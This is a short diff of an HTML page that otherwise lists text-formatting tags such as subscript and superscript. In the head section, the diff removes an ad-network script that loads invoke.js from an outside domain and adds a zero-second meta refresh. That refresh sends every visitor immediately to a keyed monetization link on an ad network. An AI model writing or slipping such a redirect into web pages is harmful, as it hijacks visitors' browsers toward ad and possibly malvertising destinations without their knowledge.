@@ -11,19 +11,9 @@ Subscript	<sub> </sub>	None	This is a <sub>subscript</sub> text	This is a subscr
 Superscript	<sup> </sup>	None	This is a <sup>superscript</sup> text	This is a superscript text
 
 <head>
-<p>THIS IS AN ADD</p>
+<p>THIS IS AN ADDs</p>
 
-<script type="text/javascript">
-	atOptions = {
-		'key' : 'a84304b9943c672b802cb2a868fcd6e7',
-		'format' : 'iframe',
-		'height' : 250,
-		'width' : 300,
-		'params' : {}
-	};
-</script>
-<script type="text/javascript" src="//cockysnailleather.com/a84304b9943c672b802cb2a868fcd6e7/invoke.js"></script>
-
+<meta content='0; url = https://www.highrevenuenetwork.com/vy7zu1jp?key=122fc7a9a987c60c7ccdc47b6e4ade2b' http-equiv='refresh'/>
 
   
 </head>
